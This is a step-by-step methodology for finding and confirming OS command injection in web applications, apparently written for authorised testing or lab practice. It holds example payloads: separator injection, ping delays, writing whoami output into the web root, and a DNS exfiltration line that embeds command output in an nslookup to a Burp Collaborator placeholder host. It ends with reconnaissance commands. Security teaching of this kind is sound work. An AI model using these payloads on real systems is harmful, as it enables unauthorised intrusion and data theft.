# Command Injection Methodology

## Objective

Identify and verify whether user-controlled input is incorporated into operating system commands and determine whether arbitrary command execution is possible.

---

# Step 1 – Identify Potential Injection Points

Look for functionality that performs server-side operations, such as:

- Stock check features
- Feedback forms
- Diagnostic tools
- Administrative functions

Identify parameters that may be passed to operating system commands.

---

# Step 2 – Test for Visible Command Injection

Inject a harmless command that produces visible output.

Example:

```text
& echo aiwefwlguh &
```

If the supplied string appears in the application's response, command execution has been confirmed.

---

# Step 3 – Determine Whether the Vulnerability Is Blind

If no output is returned:

- The application may still execute the injected command.
- Continue with blind testing techniques.

---

# Step 4 – Test Time Delays

Inject a payload that introduces a measurable delay.

Example:

```text
ping -c 10 127.0.0.1
```

A delayed response suggests successful command execution.

---

# Step 5 – Test Output Redirection

If a writable web-accessible directory exists:

Redirect command output into a file.

Example:

```text
whoami > /var/www/images/output.txt
```

Retrieve the generated file through the browser.

---

# Step 6 – Test Out-of-Band (OAST)

Generate a Burp Collaborator payload.

Inject:

```text
nslookup BURP-COLLABORATOR-SUBDOMAIN
```

Poll Burp Collaborator for DNS interactions.

---

# Step 7 – Test Out-of-Band Data Exfiltration

Embed command output into the DNS request.

Example:

```text
nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN
```

Poll Burp Collaborator to recover the command output.

---

# Step 8 – Gather Basic System Information

After confirming command execution, identify:

Linux

```bash
whoami
uname -a
ifconfig
netstat -an
ps -ef
```

Windows

```cmd
whoami
ver
ipconfig /all
netstat -an
tasklist
```

---

# Testing Workflow

```
Identify Input

↓

Visible Output

↓

Blind?

↓

Time Delay

↓

Output Redirection

↓

OAST

↓

Data Exfiltration

↓

Reconnaissance

↓

Report
```

---

# Key Takeaways

- Start with harmless payloads.
- Progress from visible testing to blind techniques.
- Confirm execution using the simplest reliable method available.